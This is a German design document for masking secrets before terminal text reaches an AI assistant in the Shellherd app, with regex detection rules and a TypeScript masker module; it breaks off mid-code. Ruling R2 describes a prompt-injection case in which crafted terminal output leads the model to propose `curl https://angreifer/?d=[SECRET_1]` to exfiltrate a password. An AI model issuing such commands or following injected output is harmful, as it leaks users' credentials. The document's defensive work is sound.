# KI-Maskierung: Geheimnisse vor dem Senden an den Assistenten maskieren – Design

> Übernommen aus dem Konzept (Opus, `.superpowers/sdd/ki-maskierung-research.md`). Bindend geht `2026-10-25-ki-maskierung-validation.md` vor.

Branch `claude/feature/ki-maskierung`, gestapelt auf 0.24.0, Ziel **0.25.0**. Die Umsetzer sind Haiku-Modelle; Signaturen, Texte und Fehlercodes unten sind wörtlich zu übernehmen.


Branch `claude/feature/ki-maskierung`, gestapelt auf haertung (0.24.0), Ziel **0.25.0**, CHANGELOG-Datum `2026-10-25`.

Ziel: Bevor Text an den KI-Assistenten (externer Anbieter) geht, ersetzt Shellherd Geheimnisse durch stabile Platzhalter `[SECRET_n]`. Das gilt für Muster (PEM, Tokens, `password=` …) und für die Passwörter, Passphrasen und API-Schlüssel aus dem Vault.

Die Umsetzer sind Haiku-Modelle. Signaturen, Texte, Fehlercodes und Code-Blöcke unten sind verbindlich und wörtlich zu übernehmen. Der Masker aus 3.2 ist als Prototyp gelaufen (Scratchpad): Die Demo-Fixture aus 6.0 ist vollständig maskiert, Hashes, Commit-IDs und UUIDs bleiben stehen, und jede bösartige 256-KiB-Eingabe braucht weniger als 30 ms.

---

## 0. Bestand (mit Fundstellen)

### 0.1 Der eine Engpass im Main
- **Alles, was an einen Anbieter geht, läuft durch `AssistantService.ask`** (`src/main/ai/assistant.ts:58-73`). Dort entsteht der `ChatRequest` aus `systemPrompt(request.context, …)` und `request.messages` und geht an `streamChat` (`:65`).
  - `streamChat` verteilt auf Anthropic-SDK oder HTTP (`src/main/ai/providers.ts:301-303`). Die Bodies für OpenAI, Azure und Gemini baut `httpRequests` (`:199-214`), den für Anthropic baut `streamAnthropic` (`:277-298`). Wird vor `streamChat` maskiert, sind alle vier Anbieter abgedeckt.
  - `AssistantService.test` (`assistant.ts:86-99`) sendet nur feste Texte (`assistant.test.system`/`user`). Dort gibt es nichts zu maskieren.
- **Es gibt keine Werkzeuge (Tool Use) und keinen Verlauf im Main.** Der Renderer hält jede Unterhaltung und schickt pro Anfrage den Verlauf komplett mit (`AssistantPanel.tsx:115-122`). Main ist zustandslos je Anfrage.
- IPC-Grenze `ai:ask` (`src/main/ai/ipc.ts:13-19,33-36`): höchstens 40 Nachrichten, je 64 KiB, zusammen 256 KiB, `context` = `{ shell, target }`. Die Eingabe ist damit begrenzt, und das zählt für die Laufzeit (R6).
- Ereignisse an den Renderer: `delta | done | error` (`src/shared/ai.ts:20-23`), gesendet über `emit` (`ipc.ts:27-30`).
- Lebenszyklus: `cancelOwner` beim Schließen eines Fensters (`src/main/index.ts:84`), `cancelAll` in `closeAllSessions` beim Trennen oder Vault-Wechsel (`:86`, `onSessionChange` `:366`). Sperren ruft keines von beiden (`:367`, `:374`).

### 0.2 Welche Inhalte heute an die KI gehen
Der Assistent arbeitet **nur auf Terminal-Tabs**: SSH, PowerShell, CMD, Container-Shell und Pod-Shell (`src/renderer/src/terminal-tabs.ts:57-63`). Datei-, Container- und Willkommens-Ansicht sind ausgenommen, ebenso Kubernetes-Logs und Pod-YAML.

| Kanal | Fundstelle | Inhalt |
|---|---|---|
| Frage mit Bildschirm | `AssistantPanel.tsx:167-177`, `assistant-chat.ts:58-60` | Frage plus die letzten 80 Terminal-Zeilen (`SCREEN_LINES`), gekürzt auf 6 000 Zeichen |
| Gelesene Ausgabe (automatisch nach Enter oder `Ausgabe einordnen`) | `AssistantPanel.tsx:148-165,227-233`, `assistant-chat.ts:66-68` | Befehl plus bis zu 300 Zeilen Ausgabe, gekürzt auf 8 000 Zeichen |
| Verlauf | `AssistantPanel.tsx:117-118`, `assistant-chat.ts:71-80` | bis 12 Nachrichten: frühere Nutzer-Nachrichten auf 600 Zeichen gekürzt, frühere Antworten ganz |
| System-Prompt | `assistant.ts:23-29` | Regeln plus `target` = `"<Name>, <Adresse>"` (`AssistantPanel.tsx:122`) |
| Fehlertexte | – | gehen **nicht** an die KI, nur an den Renderer |

**Folge:** Kubernetes-Secrets, Logs, YAML und Container-Umgebungen erreichen die KI nur, wenn sie **im Terminal** stehen (`kubectl get secret -o yaml`, `docker inspect`, `cat .env`, `env`). Genau dort setzt die Maskierung an.

**Zwei Lecks vor der Maskierung (Pflicht in dieser Stufe):**
1. **Umbrochene Zeilen werden zerrissen.** `screen()` und `linesFrom()` lesen Zeile für Zeile, ohne umbrochene Zeilen zusammenzuführen (`src/renderer/src/terminal-access.ts:49-54`), anders als `bufferText` (`:30-42`). Ein JWT oder Schlüssel, der breiter ist als das Terminal, kommt als zwei Bruchstücke mit `\n` dazwischen an, und kein Muster greift mehr.
2. **Kürzen mitten in einer Zeile.** `tail` schneidet die ersten Zeichen ab (`assistant-chat.ts:44-46`), `compactMessage` die letzten nach 600 Zeichen (`:71-73`). Ein angeschnittener Token (etwa `ghp_` plus 20 statt 36 Zeichen) passt auf kein Muster mehr, und sein Anfang geht hinaus.

### 0.3 Vorhandene Maskierung (nicht auf dem KI-Weg)
- Container-Ansicht: `maskInspect`/`maskEnvText` mit `SECRET_NAME` (`src/main/containers/inventory-parsers.ts:254-299`). Das lineare Lookbehind-Muster dort ist das Vorbild für 3.2.
- Kubernetes-Ansicht: `toYaml` ersetzt `data`/`stringData` von Secrets und `last-applied` (`src/main/kubernetes/describe.ts:38-60`), Describe nennt nur Referenzen (`:61-68`, `:118-163`).
- Fensterkopien ohne Zugangsdaten: `redactSecrets`/`redactVault` (`src/shared/vault/connections.ts:33-47`).
- RDP-Debuglog maskiert Passwörter (`src/main/rdp/host.ts:12`).
- **Auf dem KI-Weg gibt es keine Maskierung.** Gesucht wurde nach `mask`, `redact` und `secret`.

### 0.4 Geheimnisse im Vault
- `Authentication`: `password` und `passphrase` (`src/shared/vault/types.ts:5-17`). SSH und SFTP nutzen sie.
- RDP: `password` (`types.ts:116`).
- KI-Anbieter: `apiKey` (`types.ts:206`).
- **Nicht im Vault:** das Vault-Passwort selbst und die Antworten auf Anmelde-Rückfragen (keyboard-interactive, `AuthPromptDialog`).
- `AiProviderSchema` ist ein nicht-striktes `z.object` (`src/shared/vault/schema.ts:249-257`). Unbekannte Felder verwirft es, ein neues optionales Feld ist abwärtskompatibel.

### 0.5 Oberfläche
- Panel: `.assistant-context` als Kontextzeile (`AssistantPanel.tsx:196-197`). `.assistant-note` ist die leise, rechtsbündige Zeile für automatische Nachrichten (`assistant-ui.css`, letzte Zeile). Unter jedem Befehl stehen eine Statuszeile (`Vorschlag` / `In die Eingabezeile geschrieben …`) und `Eintippen` (`AssistantPanel.tsx:214-221`).
- Anbieter-Formular: `field()` (`AiSettingsDialog.tsx:66-75`), Formular `:101-125`, Liste `:84-94`.
- Handbuch: „KI-Anbieter“ (`docs/handbuch.md:183-185`), Manual „AI providers“ (`docs/manual.md:182-184`). Ein Kapitel zum Assistenten selbst gibt es nicht.

### 0.6 run-app
- Der KI-Fake auf `127.0.0.1:9335` prüft nur den Bearer-Key und antwortet fest (`.claude/skills/run-app/ai-fake.mjs:60-78`). **Er protokolliert nichts.**
- Der Demo-Anbieter `Demo-KI` zeigt auf `http://127.0.0.1:9335/v1` mit dem Schlüssel `sk-synthetic-demo` (`demo-setup.mjs:118`). Das Passwort von web-01 ist `synthetic-demo` (`:151`).
- Der Demo-SSH-Server beantwortet feste Befehle aus `outputs` (`sshd.mjs:25-33`).
- Der bestehende Test `fakes.test.mjs:122-134` startet den Fake mit dem Standard-`runDir`, also `%TEMP%\shellherd-run`.

---

## 1. Empfehlungen

| # | Fläche / Funktion | Wert | Aufwand |
|---|---|---|---|
| 1a | Maskierung in `AssistantService.ask` direkt vor `streamChat`: System-Prompt und **jede** Nachricht, also auch Verlauf, gelesene Ausgaben und frühere Antworten | ★★★ | kleine Main-Änderung (ein neues Modul) |
| 1b | Vault-Literale: Passwörter, Passphrasen, RDP-Passwörter und API-Schlüssel ab 6 Zeichen, zusätzlich URL-kodiert | ★★★ | Main |
| 1c | Musterregeln: PEM (auch angeschnitten), Name=Wert / Name: Wert / `--flag wert`, URL-Passwort, Bearer/Basic, AWS, GitHub, Slack, OpenAI/Anthropic, Google, Azure (`AccountKey`, `sig=`), JWT, base64-PEM, Secret-`data:` | ★★★ | Main |
| 1d | Stabile Platzhalter `[SECRET_n]` je Unterhaltung. Ein einmal gefundener Wert wird in späteren Texten derselben Unterhaltung auch ohne Muster maskiert | ★★★ | Main plus `conversationId` vom Renderer |
| 1e | **Keine Rückübersetzung**, weder in der Anzeige noch in Befehlen (R2) | ★★★ | – |
| 1f | Zeile „Vertrauliche Werte maskiert: N“ unter der Frage | ★★ | nur Renderer plus ein Ereignis |
| 1g | Statuszeile „Enthält maskierte Werte. Setze sie vor Enter selbst ein.“ unter Befehlen mit Platzhalter | ★★ | nur Renderer |
| 1h | Schalter je Anbieter, Standard **an**, auch für localhost. Ist er aus, zeigt das Panel einen Hinweis | ★★ | Renderer plus ein Schemafeld |
| 1i | Umbrochene Terminalzeilen zusammenführen, Kürzen nur an Zeilengrenzen | ★★★ | nur Renderer |
| 1j | Scheitert die Maskierung, wird nichts gesendet (`ai.maskFailed`) | ★★★ | Main |
| 1k | Der KI-Fake protokolliert jede Anfrage, die Szene `masking` belegt: Kein synthetisches Geheimnis erreicht den Fake | ★★★ | run-app |
| 1l | Eigene Muster und Literale je Vault, Vorschau „Was wird gesendet“, Hover-Anzeige, JSON-Secrets, `mysql -p…`, `sshpass -p` | ★ | nicht jetzt (Abschnitt 8) |

---

## 2. Rulings (Entscheidungen mit Begründung)

**R1 Ort: Main, in `AssistantService.ask`, nach der IPC-Prüfung und vor `streamChat`.**
- Masker ist das neue reine Modul `src/main/ai/secret-mask.ts`, ohne Electron und ohne I/O.
- Maskiert werden `system` und **jede** `messages[i].content`, egal welche Rolle. Frühere Antworten der KI enthalten normalerweise nur Platzhalter, das Maskieren schadet dort nicht.
- Der Renderer maskiert nichts selbst. Er ist nicht die Vertrauensgrenze, und so gibt es eine einzige Stelle, die prüfbar ist.
- `test()` bleibt unverändert, denn es sendet feste Texte.

**R2 Keine Rückübersetzung.** Antworten bleiben mit `[SECRET_n]` stehen, in der Anzeige, in `Eintippen`, `Kopieren` und `Als Workflow`. Main gibt die Zuordnung nie heraus.
- **Begründung 1, Prompt-Injection:** Terminaltext ist fremdbestimmt. Eine präparierte Ausgabe kann das Modell dazu bringen, `curl https://angreifer/?d=[SECRET_1]` vorzuschlagen. Mit Rückübersetzung stünde dort das echte Passwort, und ein Enter schickte es hinaus. Ohne Rückübersetzung ist der Befehl wertlos.
- **Begründung 2:** Ein Befehl mit echtem Passwort landete im Shell-Verlauf, in Workflows und in der Zwischenablage. Mit dem Platzhalter tippt der Nutzer das Passwort bewusst selbst oder nimmt eine Variable.
- Ausgleich: Unter jedem Befehl mit Platzhalter steht „Enthält maskierte Werte. Setze sie vor Enter selbst ein.“ `Eintippen` bleibt erlaubt, denn ohne Enter läuft nichts (bestehende Regel `assistant-chat.ts:31-41`).
- Im System-Prompt steht eine Zeile: Platzhalter unverändert übernehmen, nicht raten, nicht danach fragen (3.4).

**R3 Platzhalter stabil je Unterhaltung.**
- Format: `[SECRET_<n>]`, `n` ab 1, vergeben in der Reihenfolge des ersten Auftretens.
- Eine Unterhaltung ist `(ownerId, conversationId)`. Der Renderer erzeugt die `conversationId` je Tab (`crypto.randomUUID()`), `Verlauf leeren` erzeugt eine neue.
- Main hält höchstens 32 Masker (LRU). `cancelOwner` verwirft die Masker eines Fensters, `cancelAll` (Trennen, Vault-Wechsel) verwirft alle.
- Beim **Sperren bleiben sie erhalten**. Die Sperre hält Zugangsdaten offener Sitzungen ohnehin im Speicher (`handbuch.md:74`), und nach dem Entsperren geht die Unterhaltung mit denselben Nummern weiter.
- **Bekannte Werte:** Ein Wert, den eine Regel einmal gefunden hat (mindestens 6 Zeichen), wird in allen späteren Texten derselben Unterhaltung maskiert, auch ohne Muster. Beispiel: `DB_PASSWORD=x9…` in der Ausgabe, danach `mysql -px9…` in der Frage. Nach der Regelsuche gibt es dafür einen Durchgang über alle bekannten Werte, den längsten zuerst.

**R4 Sichtbarkeit.**
- Main sendet vor dem ersten `delta` das Ereignis `{ type: 'masked', requestId, count }`, wenn in der **letzten** Nutzer-Nachricht mindestens ein Platzhalter steht. `count` zählt die verschiedenen Platzhalter darin. Der Verlauf zählt nicht noch einmal, er wurde schon gemeldet.
- Das Panel zeigt unter der Frage (bei automatischen Nachrichten in derselben Zeile) „Vertrauliche Werte maskiert: 2“ im Stil `.assistant-note`.
- Welche Werte maskiert wurden, zeigt Shellherd nicht. Der Nutzer sieht seinen Text ohnehin, und eine Anzeige der Zuordnung wäre ein neuer Weg, über den sie hinausgehen kann.

**R5 Einstellung: je Anbieter, Standard an, ohne Ausnahme für localhost.**
- Feld `AiProvider.maskSecrets?: boolean`. Fehlt es oder ist es `true`, wird maskiert; nur `false` schaltet ab. Bestehende Vaults maskieren damit ab 0.25.0 sofort.
- **Keine Ausnahme für localhost:**
  1. Ein lokaler Endpunkt ist oft ein Gateway (LiteLLM, Firmen-Proxy, Ollama hinter einem Tunnel), das Anfragen protokolliert oder weiterleitet.
  2. Für ein lokales Modell kostet die Maskierung nichts. Es braucht die echten Werte nicht, um zu helfen.
  3. Der run-app-Fake läuft selbst auf localhost. Mit einer Ausnahme wäre die Abnahme wertlos.
- Abschalten geht bewusst im Formular (`Geheimnisse vor dem Senden maskieren (empfohlen)`). Ist die Maskierung aus, zeigt das Panel „Maskierung ist für diesen Anbieter aus: Terminaltext geht unverändert hinaus.“, und die Anbieterliste nennt „Maskierung aus“.
- `AiProviderInfo` bekommt `masking: boolean`. Der Schlüssel selbst bleibt im Main.
- Keine globale Einstellung: Sie wäre ein zweiter Schalter mit unklarem Vorrang.

**R6 Leistung und ReDoS: nur lineare Muster, harte Längen.**
- Jede Regex hat genau eine Form: Lookbehind-Grenze oder festes Präfix, dann **eine** Zeichenklasse mit begrenztem Quantor. Keine verschachtelten Quantoren und keine Alternativen über überlappende Klassen.
- Die Lookbehind-Grenze verhindert, dass ein Lauf aus Namenszeichen von jeder Position neu gestartet wird. Das ist dasselbe Prinzip wie `ENV_NAME` in `inventory-parsers.ts:256-257`.
- Name=Wert-Paare und URLs werden von Hand gelesen (`valueSpan`, `urlSpans`) und überspringen den gelesenen Wert (`lastIndex = span.end`). Sonst liefe `password=` × 30 000 quadratisch.
- Längen: Wert höchstens 4 096 Zeichen, URL-Authority 1 024, Namen 64. Die Eingabe ist durch IPC auf 256 KiB begrenzt.
- Pflichttest: 26 bösartige Eingaben mit je 256 KiB brauchen jeweils weniger als 1 000 ms (Prototyp: unter 30 ms), dazu 1 000 Vault-Literale auf 256 KiB unter 1 000 ms (Prototyp: 27 ms). Es gibt keinen Worker und kein Zeitlimit; die Linearität ist im Aufbau gesichert und durch den Test belegt.

**R7 Falsch-Positive: kein Entropie-Detektor.**
- Erkannt wird nur über Namen, feste Präfixe, Strukturen (PEM, URL, JWT, Secret-`data:`) oder Vault-Werte.
- Hex-Hashes, Commit-IDs, `sha256:`-Digests, UUIDs, öffentliche SSH-Schlüssel und Container-IDs bleiben **immer** stehen. Das sichert ein Pflichttest.
- Namen müssen **auf** das Schlüsselwort **enden** (`DB_PASSWORD`, `apiKey`, `client_secret`). Dadurch bleiben `max_tokens`, `token_count`, `secretName`, `password_min_length` und `[sudo] password for demo:` unverändert.
- Werte wie `true`, `false`, `null`, `***`, `<…>`, `$VAR`, `${VAR}`, `%VAR%`, `{{x}}`, YAML-`|`/`>` und vorhandene Platzhalter werden übersprungen.
- Vault-Literale unter 6 Zeichen werden nicht gesucht (`MIN_LITERAL_LENGTH`). Die Grenze steht im Handbuch.
- Die Regel für `data:` gilt nur, wenn der Text `kind: Secret` enthält. Eine ConfigMap im selben Text wird dann mit maskiert. Das ist die sichere Richtung.

**R8 Scheitern heißt nicht senden.** Wirft der Masker, folgt `AiError('ai.maskFailed')`, und es geht nichts hinaus.

**R9 Lecks im Renderer schließen (1i).**
- `rangeText` führt umbrochene Zeilen zusammen und beginnt eine Zeile, die mitten in einem Umbruch anfängt, an ihrem Anfang.
- `tail` und `compactMessage` schneiden an Zeilengrenzen. Nur eine einzelne Zeile, die länger ist als das Budget, wird weiter mitten im Text gekürzt (Grenze, Handbuch).

**R10 Keine Änderung an `toYaml`, `maskInspect` und den Ansichten.** Sie maskieren schon und erreichen die KI nicht.

### Allgemein
- **R11** Keine Bewegung und keine neuen Tokens. Neues CSS nutzt nur vorhandene `var(--…)` (eine Regel `.ai-check`).
- **R12** Alle Texte laufen über `t()` und `mainT`. Neue Keys kommen in de-DE und en-US als volle Literale. Platzhalter heißen nie `{{count}}`, Zahlen kommen über `formatNumber`.
- **R13** Synthetische Geheimnisse in Tests und Fixtures werden **aus Teilen zusammengesetzt** (`['gh', 'p_', …].join('')`). So schlägt das Secret Scanning von GitHub beim Push nicht an. Echte Werte kommen nie vor.
- **R14** Version 0.25.0, CHANGELOG `## [0.25.0] – 2026-10-25`.

---

## 3. Vertrag (wörtlich)

### 3.1 `src/shared/ai.ts` (Task A)
`AiProviderInfo` ersetzen:
```ts
/** Provider as windows see it: never the API key. `masking` is false only when the user switched masking off. */
export interface AiProviderInfo { id: string; name: string; kind: AiProviderKind; model: string; masking: boolean }
```
`AiAskRequest` ersetzen:
```ts
export interface AiAskRequest {
  requestId: string;
  /** One per tab conversation (new after "Clear history"); keeps [SECRET_n] placeholders stable across turns. */
  conversationId: string;
  providerId?: string;
  messages: AiChatMessage[];
  context: AiTerminalContext;
}
```
`AiEvent` ersetzen:
```ts
export type AiEvent =
  | { type: 'masked'; requestId: string; count: number }
  | { type: 'delta'; requestId: string; text: string }
  | { type: 'done'; requestId: string }
  | { type: 'error'; requestId: string; error: CodedError };
```
Nach `AiEvent` anfügen:
```ts
/** A placeholder main put in for a secret before sending; the real value never comes back. */
export const SECRET_PLACEHOLDER = /\[SECRET_\d{1,6}\]/;
```

`src/shared/vault/types.ts` (Task A), in `AiProvider` nach `apiVersion`:
```ts
  /** Absent or true: secrets are masked before sending; false only by the user's choice. */
  maskSecrets?: boolean;
```
`src/shared/vault/schema.ts` (Task A), in `AiProviderSchema` nach `apiVersion`:
```ts
  maskSecrets: z.boolean().optional(),
```

### 3.2 `src/main/ai/secret-mask.ts` (neu, Task B)
```ts
import type { Vault, VaultNode } from '../../shared/vault/types';

/** Vault values and earlier finds shorter than this are not searched for: they would hit ordinary words and numbers. */
export const MIN_LITERAL_LENGTH = 6;
/** Longest value read after a secret name or inside quotes. */
const MAX_VALUE = 4096;

interface Span { start: number; end: number }

export interface MaskResult {
  text: string;
  /** Placeholder numbers that occur in this text. */
  numbers: Set<number>;
}

// Linear patterns only: a boundary lookbehind or a literal prefix, then one bounded character class (no nesting, no ReDoS).
const TOKEN_RULES: readonly RegExp[] = [
  /(?<![A-Za-z0-9])(?:AKIA|ASIA|ABIA|ACCA)[A-Z0-9]{16}(?![A-Za-z0-9])/g, // AWS access key id
  /(?<![A-Za-z0-9_])gh[pousr]_[A-Za-z0-9]{36,255}/g, // GitHub tokens
  /(?<![A-Za-z0-9_])github_pat_[A-Za-z0-9_]{22,255}/g, // GitHub fine-grained tokens
  /(?<![A-Za-z0-9-])xox[abposr]-[A-Za-z0-9-]{10,250}/g, // Slack tokens
  /(?<![A-Za-z0-9_-])sk-[A-Za-z0-9_-]{20,250}/g, // OpenAI and Anthropic (sk-proj-…, sk-ant-…)
  /(?<![A-Za-z0-9_-])AIza[A-Za-z0-9_-]{35}/g, // Google API key
  /(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{8,4096}\.eyJ[A-Za-z0-9_-]{8,8192}\.[A-Za-z0-9_-]{0,4096}/g, // JWT
  /(?<![A-Za-z0-9+/])LS0tLS1CRUdJTi[A-Za-z0-9+/]{16,65536}={0,2}/g, // base64 of "-----BEGIN …" (Kubernetes tls.key)
  /(?<=hooks\.slack\.com\/services\/)[A-Za-z0-9/]{20,120}/g, // Slack webhook path
  /(?<=[?&]sig=)[A-Za-z0-9%+/=]{16,256}/g, // Azure SAS signature
  /(?<=\b[Bb]earer[ \t]{1,8})[A-Za-z0-9._~+/=-]{16,4096}/g, // Bearer token
  /(?<=\b[Aa]uthorization[ \t]{0,8}[:=][ \t]{0,8}[Bb]asic[ \t]{1,8})[A-Za-z0-9+/=]{8,4096}/g, // Basic auth
];
/** The name must end with one of these: DB_PASSWORD, apiKey, client_secret match; max_tokens, secretName do not. */
const SECRET_NAME = /(?:pass|passwd|password|passphrase|pwd|secret|token|api[_-]?key|access[_-]?key|private[_-]?key|account[_-]?key|subscription[_-]?key|credentials?|auth|dockerconfigjson|dockercfg)$/i;
/** `name=`, `name:`, `"name": `, `name =>`; the lookbehind starts a name only once per run of name characters. */
const ASSIGN = /(?<![A-Za-z0-9_.-])([A-Za-z_][A-Za-z0-9_.-]{0,63})["']?[ \t]{0,8}(?:=>?|:)[ \t]{0,8}/g;
/** `--password value`, `--token=value`, `-Password value`. */
const FLAG = /(?<![A-Za-z0-9_-])--?([A-Za-z][A-Za-z0-9_-]{0,63})(?:=|[ \t]{1,8})/g;
/** Values that are no secret: flags, references, masks and placeholders. */
const SKIP_VALUE = /^(?:true|false|null|none|yes|no|[|>][+-]?|\*+|•+|x{3,}|\[SECRET_\d{1,6}\]|<[^<>]{0,64}>|\$\{?[A-Za-z_][A-Za-z0-9_]{0,63}\}?|%[A-Za-z_][A-Za-z0-9_]{0,63}%|\{\{[^{}]{0,64}\}\})$/i;
const BARE_END = /[\s"'`;&]/;
const PLACEHOLDER = /^\[SECRET_\d{1,6}\]$/;
const SCHEME = /(?<![A-Za-z0-9+.-])[A-Za-z][A-Za-z0-9+.-]{1,30}:\/\//g;
const AUTHORITY_END = /[\s/?#"'<>]/;
const PEM_EDGE = /-----(BEGIN|END) [A-Z0-9 ]{0,40}PRIVATE KEY(?: BLOCK)?-----/g;
const BASE64_LINE = /^[A-Za-z0-9+/=]{16,}$/;
const SECRET_KIND = /\bkind:[ \t]*Secret\b/;
const DATA_KEY = /^(?:data|stringData):$/;

/** Value right after a separator: quoted up to the closing quote (or the line end), bare up to whitespace, quote, ; or &. */
function valueSpan(text: string, at: number): Span | null {
  const quote = text[at];
  let start = at;
  let end = at;
  if (quote === '"' || quote === "'") {
    start = end = at + 1;
    while (end < text.length && end - start < MAX_VALUE && text[end] !== quote && text[end] !== '\n' && text[end] !== '\r') end += text[end] === '\\' && quote === '"' ? 2 : 1;
    end = Math.min(end, text.length);
  } else {
    while (end < text.length && end - start < MAX_VALUE && !BARE_END.test(text[end])) end += 1;
  }
  const value = text.slice(start, end);
  return value && !SKIP_VALUE.test(value) ? { start, end } : null;
}

/** Values of secret-sounding names; a found value is skipped as a whole so long runs stay linear. */
function pairSpans(text: string): Span[] {
  const spans: Span[] = [];
  for (const rule of [ASSIGN, FLAG]) {
    rule.lastIndex = 0;
    for (let match = rule.exec(text); match; match = rule.exec(text)) {
      if (!SECRET_NAME.test(match[1])) continue;
      const at = rule.lastIndex;
      // `--password --next`: the next flag is no value.
      if (rule === FLAG && text[at] === '-') continue;
      const span = valueSpan(text, at);
      if (span) { spans.push(span); rule.lastIndex = Math.max(rule.lastIndex, span.end); }
    }
  }
  return spans;
}

/** scheme://user:password@host → the password; parsed by hand, the authority is at most 1024 characters. */
function urlSpans(text: string): Span[] {
  const spans: Span[] = [];
  SCHEME.lastIndex = 0;
  for (let match = SCHEME.exec(text); match; match = SCHEME.exec(text)) {
    const start = SCHEME.lastIndex;
    let end = start;
    while (end < text.length && end - start < 1024 && !AUTHORITY_END.test(text[end])) end += 1;
    const authority = text.slice(start, end);
    const at = authority.lastIndexOf('@');
    const colon = authority.indexOf(':');
    if (at > 0 && colon >= 0 && colon < at - 1) spans.push({ start: start + colon + 1, end: start + at });
    SCHEME.lastIndex = Math.max(SCHEME.lastIndex, end);
  }
  return spans;
}

/** The span without surrounding whitespace, or null if nothing is left. */
function trimmed(text: string, start: number, end: number): Span | null {
  while (start < end && /\s/.test(text[start])) start += 1;
  while (end > start && /\s/.test(text[end - 1])) end -= 1;
  return start < end ? { start, end } : null;
}

/**
 * Bodies of private key blocks. A block without END (cut off) runs to the end of the text; an END without
 * BEGIN (the start scrolled away) takes the base64 lines right above it.
 */
function pemSpans(text: string): Span[] {
  const spans: Span[] = [];
  let open = -1;
  PEM_EDGE.lastIndex = 0;
  for (let match = PEM_EDGE.exec(text); match; match = PEM_EDGE.exec(text)) {
    if (match[1] === 'BEGIN') { if (open < 0) open = PEM_EDGE.lastIndex; continue; }
    let start = open;
    if (start < 0) {
      start = match.index;
      for (;;) {
        const lineEnd = start - 1;
        if (lineEnd < 0) break;
        const lineStart = text.lastIndexOf('\n', lineEnd - 1) + 1;
        if (!BASE64_LINE.test(text.slice(lineStart, lineEnd).trim())) break;
        start = lineStart;
      }
    }
    const span = trimmed(text, start, match.index);
    if (span) spans.push(span);
    open = -1;
  }
  if (open >= 0) { const span = trimmed(text, open, text.length); if (span) spans.push(span); }
  return spans;
}

/** `kubectl get secret -o yaml`: every value under data:/stringData: when the text names kind: Secret. */
function secretDataSpans(text: string): Span[] {
  if (!SECRET_KIND.test(text)) return [];
  const spans: Span[] = [];
  let block = -1;
  let position = 0;
  for (const line of text.split('\n')) {
    const content = line.trimEnd();
    const body = content.trimStart();
    const indent = content.length - body.length;
    if (block >= 0 && body && indent <= block) block = -1;
    if (block < 0) { if (DATA_KEY.test(body)) block = indent; }
    else {
      const colon = body.indexOf(': ');
      if (colon > 0) { const span = trimmed(text, position + indent + colon + 2, position + content.length); if (span) spans.push(span); }
    }
    position += line.length + 1;
  }
  return spans;
}

/** All rule hits, sorted and merged where they overlap. */
function findSpans(text: string): Span[] {
  const spans = [...pairSpans(text), ...urlSpans(text), ...pemSpans(text), ...secretDataSpans(text)];
  for (const rule of TOKEN_RULES) for (const match of text.matchAll(rule)) spans.push({ start: match.index!, end: match.index! + match[0].length });
  spans.sort((a, b) => a.start - b.start || b.end - a.end);
  const merged: Span[] = [];
  for (const span of spans) {
    const last = merged.at(-1);
    if (last && span.start < last.end) last.end = Math.max(last.end, span.end);
    else merged.push({ ...span });
  }
  return merged;
}

/** Stable placeholders for one conversation: the same value always gets the same [SECRET_n]. */
export class SecretMasker {
  private readonly numbers = new Map<string, number>();

  private placeholder(value: string, used: Set<number>): string {
    let number = this.numbers.get(value);
    if (number === undefined) { number = this.numbers.size + 1; this.numbers.set(value, number); }
    used.add(number);
    return `[SECRET_${number}]`;
  }

  /**
   * Vault values first (callers pass them longest first), then the rules, then every value this
   * conversation has masked before, so a password found once stays hidden where no rule sees it.
   */
  mask(text: string, literals: readonly string[]): MaskResult {
    const used = new Set<number>();
    let current = text;
    for (const literal of literals) if (current.includes(literal)) current = current.split(literal).join(this.placeholder(literal, used));
    let out = '';
    let from = 0;
    for (const span of findSpans(current)) {
      const value = current.slice(span.start, span.end);
      if (PLACEHOLDER.test(value)) continue;
      out += current.slice(from, span.start) + this.placeholder(value, used);
      from = span.end;
    }
    let result = out + current.slice(from);
    const known = [...this.numbers.keys()].filter(value => value.length >= MIN_LITERAL_LENGTH).sort((a, b) => b.length - a.length);
    for (const value of known) if (result.includes(value)) result = result.split(value).join(this.placeholder(value, used));
    return { text: result, numbers: used };
  }
}

/** Passwords, passphrases and API keys stored in the vault (plus their URL-encoded form), longest first. */
export function vaultLiterals(vault: Vault): string[] {
  const found = new Set<string>();
  const add = (value: string | undefined): void => {
    if (!value || value.trim().length < MIN_LITERAL_LENGTH) return;
    found.add(value);
    const encoded = encodeURIComponent(value);
    if (encoded !== value) found.add(encoded);
  };
  const walk = (nodes: VaultNode[]): void => {
    for (const node of nodes) {
      if (node.type === 'folder') { walk(node.children); continue; }
      if (node.protocol === 'ssh' || node.protocol === 'sftp') {
        if (node.authentication.method === 'password') add(node.authentication.password);
        if (node.authentication.method === 'privateKey') add(node.authentication.passphrase);
      }
      if (node.protocol === 'rdp') add(node.password);
    }
  };
  walk(vault.nodes);
  for (const provider of vault.ai?.providers ?? []) add(provider.apiKey);
  return [...found].sort((a, b) => b.length - a.length);
}
```

### 3.3 `src/main/ai/assistant.ts` (Task C)
Importe ergänzen: `import type { ChatRequest } from './providers';` (zusätzlich zu `AiError, streamChat`) und `import { SecretMasker } from './secret-mask';`.

`PROMPT_LINES` bleibt. `systemPrompt` ersetzen:
```ts
export function systemPrompt(context: AiTerminalContext, locale: Locale, masked = false): string {
  const t = mainTFor(locale);
  return [
    t('assistant.prompt.intro', { shell: t(SHELL_KEYS[context.shell]), target: context.target }),
    ...PROMPT_LINES.map(key => t(key)),
    ...(masked ? [t('assistant.prompt.masked')] : []),
  ].join('\n');
}
```
`AssistantDependencies` um ein Feld ergänzen:
```ts
  /** Vault values to mask, longest first (vaultLiterals); absent in tests that do not need them. */
  secrets?: () => string[];
```
`aiCatalog` ersetzen:
```ts
export function aiCatalog(settings: AiSettings | undefined): AiCatalog {
  const providers = (settings?.providers ?? []).map(({ id, name, kind, model, maskSecrets }) => ({ id, name, kind, model, masking: maskSecrets !== false }));
  return { providers, ...(settings?.defaultProviderId ? { defaultProviderId: settings.defaultProviderId } : {}) };
}
```
Über der Klasse:
```ts
/** Conversations whose placeholders main remembers; the oldest is dropped first. */
const MAX_CONVERSATIONS = 32;
```
In der Klasse, nach `running`:
```ts
  private maskers = new Map<string, SecretMasker>();
```
Neue private Methoden (vor `ask`):
```ts
  /** Masker of one conversation, most recently used last. */
  private masker(ownerId: number, conversationId: string): SecretMasker {
    const key = `${ownerId}/${conversationId}`;
    const masker = this.maskers.get(key) ?? new SecretMasker();
    this.maskers.delete(key);
    this.maskers.set(key, masker);
    while (this.maskers.size > MAX_CONVERSATIONS) this.maskers.delete(this.maskers.keys().next().value!);
